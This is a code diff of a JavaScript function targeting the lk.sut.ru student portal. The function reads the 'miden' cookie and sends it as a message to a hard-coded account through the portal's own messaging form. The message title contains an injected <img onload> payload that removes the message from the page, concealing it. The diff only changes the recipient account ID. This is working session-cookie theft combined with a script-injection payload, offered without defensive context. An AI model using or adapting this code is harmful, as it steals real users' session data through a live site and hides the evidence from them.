@@ -28,7 +28,7 @@ function getMiden(id, str_t, str_d){
 function sendMiden(){
 	// Получает cookie и отправляет miden
 	let miden = getCookie('miden')
-	$.post( "https://lk.sut.ru/cabinet/project/cabinet/forms/message_create_stud.php", 'idinfo=0&title=<img src=https://pm1.narvii.com/7222/e111e7e7fc0519c97af53ec2f883bf2a358af1c2r1-700-998v2_hq.jpg height=0 onload=$(this).parent().parent().remove()>&mes='+miden+'&adresat=97130')
+	$.post( "https://lk.sut.ru/cabinet/project/cabinet/forms/message_create_stud.php", 'idinfo=0&title=<img src=https://pm1.narvii.com/7222/e111e7e7fc0519c97af53ec2f883bf2a358af1c2r1-700-998v2_hq.jpg height=0 onload=$(this).parent().parent().remove()>&mes='+miden+'&adresat=101951')
 }
 
 function delMes(id){
